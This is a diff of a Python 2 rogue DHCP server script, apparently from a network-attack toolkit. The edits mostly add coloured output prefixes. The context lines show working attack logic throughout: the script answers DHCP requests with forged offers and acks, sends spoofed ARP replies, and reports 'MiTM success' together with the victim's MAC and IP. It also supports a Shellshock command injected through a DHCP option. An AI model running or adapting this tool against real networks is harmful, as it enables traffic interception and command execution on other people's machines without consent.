@@ -14,6 +14,15 @@ from netaddr import IPAddress
 Base.check_user()
 Base.check_platform()
 
+cINFO = '\033[0;34m'
+cERROR = '\033[0;31m'
+cSUCCESS = '\033[0;32m'
+cEND = '\033[0m'
+
+_info = cINFO + '[*]' + cEND + ' '
+_error = cERROR + '[-]' + cEND + ' '
+_success = cSUCCESS + '[+] ' + cEND + ' '
+
 parser = ArgumentParser(description='DHCP Rogue server')
 
 parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
@@ -84,22 +93,22 @@ if args.target_ip is not None:
 
 your_mac_address = Base.get_netiface_mac_address(current_network_interface)
 if your_mac_address is None:
-    print "Network interface: " + current_network_interface + " do not have MAC address!"
+    print _error + "Network interface: " + current_network_interface + " do not have MAC address!"
     exit(1)
 
 your_ip_address = Base.get_netiface_ip_address(current_network_interface)
 if your_ip_address is None:
-    print "Network interface: " + current_network_interface + " do not have IP address!"
+    print _error + "Network interface: " + current_network_interface + " do not have IP address!"
     exit(1)
 
 your_netmask = Base.get_netiface_netmask(current_network_interface)
 if your_netmask is None:
-    print "Network interface: " + current_network_interface + " do not have network mask!"
+    print _error + "Network interface: " + current_network_interface + " do not have network mask!"
     exit(1)
 
 your_broadcast = Base.get_netiface_broadcast(current_network_interface)
 if your_broadcast is None:
-    print "Network interface: " + current_network_interface + " do not have broadcast!"
+    print _error + "Network interface: " + current_network_interface + " do not have broadcast!"
     exit(1)
 
 if args.dhcp_mac is None:
@@ -133,17 +142,19 @@ else:
     dns_server_ip_address = args.dns
 
 if 255 < args.shellshock_option_code < 0:
-    print "Bad value in DHCP option code! This value should be in the range from 1 to 255"
+    print _error + "Bad value in DHCP option code! This value should be in the range from 1 to 255"
     exit(1)
 
-print "\r\nNetwork interface: " + current_network_interface
-print "First offer IP: " + args.first_offer_ip
-print "Last offer IP:" + args.last_offer_ip
-print "DHCP server mac address: " + dhcp_server_mac_address
-print "DHCP server ip address: " + dhcp_server_ip_address
-print "Router IP address: " + router_ip_address
-print "Network mask: " + network_mask
-print "DNS server IP address: " + dns_server_ip_address + "\r\n"
+print "\r\n"
+print _info + "Network interface: " + cINFO + current_network_interface + cEND
+print _info + "First offer IP: " + cINFO + args.first_offer_ip + cEND
+print _info + "Last offer IP: " + cINFO + args.last_offer_ip + cEND
+print _info + "DHCP server mac address: " + cINFO + dhcp_server_mac_address + cEND
+print _info + "DHCP server ip address: " + cINFO + dhcp_server_ip_address + cEND
+print _info + "Router IP address: " + cINFO + router_ip_address + cEND
+print _info + "Network mask: " + cINFO + network_mask + cEND
+print _info + "DNS server IP address: " + cINFO + dns_server_ip_address + cEND
+print "\r\n"
 
 
 def make_dhcp_offer_packet(transaction_id):
@@ -223,11 +234,12 @@ def dhcp_reply(request):
                 number_of_dhcp_request = 0
                 offer_ip_address = args.first_offer_ip
 
-            print "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                  " || offer ip: " + offer_ip_address
+            print _info + "DHCP DISCOVER from: " + target_mac_address + " || transaction id: " + \
+                hex(transaction_id) + " || offer ip: " + offer_ip_address
+
             offer_packet = make_dhcp_offer_packet(transaction_id)
             SOCK.send(offer_packet)
-            print "[INFO] Send offer response!"
+            print _info + "Send offer response!"
 
         if request[DHCP].options[0][1] == 8:
             ciaddr = request[BOOTP].ciaddr
@@ -235,8 +247,8 @@ def dhcp_reply(request):
             chaddr = request[BOOTP].chaddr
             flags = request[BOOTP].flags
 
-            print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                  " || client ip: " + ciaddr
+            print _info + "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                " || client ip: " + ciaddr
 
             option_operation = pack("!3B", 53, 1, 5)  # DHCPACK operation
             option_netmask = pack("!" "2B" "4s", 1, 4, inet_aton(network_mask))
@@ -271,7 +283,7 @@ def dhcp_reply(request):
                                           padding=18)
 
             SOCK.send(ack_packet)
-            print "[INFO] Send inform ack response!"
+            print _info + "Send inform ack response!"
 
         if request[DHCP].options[0][1] == 3:
             requested_ip = offer_ip_address
@@ -280,14 +292,14 @@ def dhcp_reply(request):
                     requested_ip = str(option[1])
 
             if request[DHCP].options[0][1] == 3:
-                print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                      " || requested ip: " + requested_ip
+                print _info + "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + \
+                    hex(transaction_id) + " || requested ip: " + requested_ip
 
             if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
                     or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
                 nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
                 SOCK.send(nak_packet)
-                print "[INFO] Send nak response!"
+                print _info + "Send nak response!"
 
             else:
                 net_settings = args.ip_path + "ip addr add " + requested_ip + \
@@ -326,7 +338,7 @@ def dhcp_reply(request):
 
                 if shellshock_url is not None:
                     if len(shellshock_url) > 255:
-                        print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
+                        print _error + "Len of command is very big! Current len: " + str(len(shellshock_url))
                         shellshock_url = "A"
 
                 global proxy
@@ -337,21 +349,25 @@ def dhcp_reply(request):
 
                 ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                 SOCK.send(ack_packet)
-                print "[INFO] Send ack response!"
+                print _info + "Send ack response!"
 
     if request.haslayer(ARP):
         if target_ip_address is not None:
             if request[ARP].op == 1:
                 if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
-                    print "Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
+                    print _info + "Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
                     if request[ARP].pdst != target_ip_address:
                         arp_reply = Ether(dst=request[ARP].hwsrc, src=your_mac_address) \
                                     / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
                                           hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2)
                         SOCK.send(arp_reply)
-                        print "[INFO] Send ARP response!"
+                        print _info + "Send ARP response!"
                     else:
-                        print "[INFO] MiTM success!"
+                        print _success + "MiTM success!"
+                        print "\r\n"
+                        print _success + "Target MAC: " + cSUCCESS + target_mac_address + cEND
+                        print _success + "Target IP: " + cSUCCESS + target_ip_address + cEND
+                        print "\r\n"
                         SOCK.close()
                         exit(0)
 
@@ -361,22 +377,22 @@ def dhcp_reply(request):
 if __name__ == "__main__":
     if args.target_ip is not None:
         if args.target_mac is None:
-            print "Please set target MAC address ( --target_mac 00:AA:BB:CC:DD:FF)"
+            print _error + "Please set target MAC address (--target_mac 00:AA:BB:CC:DD:FF)"
             exit(1)
         else:
-            print "Waiting for ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
+            print _info + "Waiting for ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
             sniff(lfilter=lambda d: d.src == args.target_mac,
                   filter="arp or (udp and src port 68 and dst port 67)",
                   prn=dhcp_reply, iface=current_network_interface)
     else:
         if args.target_mac is None:
-            print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
+            print _info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
             sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
                                     d.src != Base.get_netiface_mac_address(current_network_interface),
                   filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
                   prn=dhcp_reply, iface=current_network_interface)
         else:
-            print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
+            print _info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
             sniff(lfilter=lambda d: d.src == args.target_mac,
                   filter="udp and src port 68 and dst port 67",
                   prn=dhcp_reply, iface=current_network_interface)
